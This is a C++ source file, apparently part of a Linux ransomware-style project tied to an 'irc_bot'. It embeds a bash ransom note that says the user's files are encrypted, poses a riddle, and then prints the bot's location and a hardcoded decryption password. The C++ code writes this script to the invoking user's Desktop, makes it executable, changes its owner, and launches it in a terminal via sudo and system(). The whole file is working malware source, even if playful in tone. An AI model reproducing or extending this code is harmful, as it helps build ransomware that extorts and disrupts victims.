#include "GenDecryptionScript.hpp"


std::string bashScript = R"(
#!/bin/bash

BOT_NAME="TEMP"

printf "Uh oh, your files have been encrypted!\n"

printf "To decrypt, answer this... what is the answer to life the universe and everything?\n"

while true; do
    # Prompt the user for input
    echo -n "Solution: "
    read userInput

    # Check if the user input is 4
    if [ "$userInput" -eq 42 ]; then
        break
    else
        echo "Incorrect, try again."
    fi
done

printf "CONGRATS!!! You are correct.\n"
printf "To decrypt your files, follow the below instructions\n"

printf "Here is the location of the bot that caused your predicatment:\n"
find / -type f -name $BOT_NAME 2>/dev/null

printf "Now, decrypt your files by issuing the following command in the directory of the bot:\n"
printf "$BOT_NAME DECRYPT UnhackablePassword123!\n"

)";

bool executeInTerminal(const std::string& terminalCommand, const std::string& user) {
    std::string fullCommand = "sudo " + terminalCommand;
    int result = system(fullCommand.c_str());
    return result == 0;
}

std::string getUserHome(const std::string& user) {
    struct passwd* pw = getpwnam(user.c_str());
    if (pw) {
        return std::string(pw->pw_dir);
    }
    return "";
}

std::string getInvokingUserHome() {
    const char* sudoUser = getenv("SUDO_USER");
    if (sudoUser) {
        return getUserHome(sudoUser);
    } else {
        return getUserHome(getenv("USER"));
    }
}

std::string getInvokingUser() {
    const char* sudoUser = getenv("SUDO_USER");
    if (sudoUser) {
        return std::string(sudoUser);
    } else {
        const char* user = getenv("USER");
        return user ? std::string(user) : "";
    }
}

std::string getDesktopPath(const std::string& homeDir) {
    return homeDir + "/Desktop";
}

void GenDecryptionScript::generateScript() { // TODO: abstract some of this logic away
    size_t length = 6;
    std::string temp = "RUN_SCRIPT_TO_DECRYPT_FILES_";
    temp += GeneralUtils::generateRandomAlphanumericString(length);
    temp += ".sh";
    const char* filename = temp.c_str();
    std::string homeDir = getInvokingUserHome();
    std::string desktopPath = getDesktopPath(homeDir);
    std::string desktopFile = desktopPath + "/" + filename;
    std::string invokingUser = getInvokingUser();

    std::ofstream outFile(desktopFile);
    if (!outFile) {
        std::cerr << "Failed to open file for writing on the desktop" << std::endl;
        return;;
    }

    std::string placeholder = "TEMP";
    size_t pos = bashScript.find(placeholder);
    std::string botName = "irc_bot";
    while (pos != std::string::npos) {
        bashScript.replace(pos, placeholder.length(), botName); // TEMP
        pos = bashScript.find(placeholder, pos + botName.length());
    }
    outFile << bashScript.c_str();
    outFile.close();

    std::string chmodCommand = std::string("chmod +x ") + desktopFile;
    int chmodResult = system(chmodCommand.c_str());
    if (chmodResult != 0) {
        std::cerr << "Failed to make the Bash script executable" << std::endl;
        return;;
    }

    // Change ownership to the invoking user
    if (chown(desktopFile.c_str(), getpwnam(invokingUser.c_str())->pw_uid, getpwnam(invokingUser.c_str())->pw_gid) != 0) {
        std::cerr << "Failed to change ownership of the Bash script" << std::endl;
        return;;
    }

    std::cout << "Bash script created successfully on the desktop." << std::endl;
    // List of common terminal emulators
    std::string terminals[] = {
        "gnome-terminal -- bash -c 'cd " + desktopPath + " && ./" + filename + "; exec bash'",
        "xterm -e bash -c 'cd " + desktopPath + " && ./" + filename + "; exec bash'",
        "konsole -e bash -c 'cd " + desktopPath + " && ./" + filename + "; exec bash'",
        "xfce4-terminal -- bash -c 'cd " + desktopPath + " && ./" + filename + "; exec bash'"
    };

    // Try each terminal command until one works
    bool success = false;
    for (const auto& terminalCommand : terminals) {
        if (executeInTerminal(terminalCommand, invokingUser)) {
            success = true;
            break;
        }
    }

    if (!success) {
        std::cerr << "Failed to open the Bash script in a new terminal window" << std::endl;
        return;;
    }

    std::cout << "Bash script executed in a new terminal window successfully." << std::endl;
}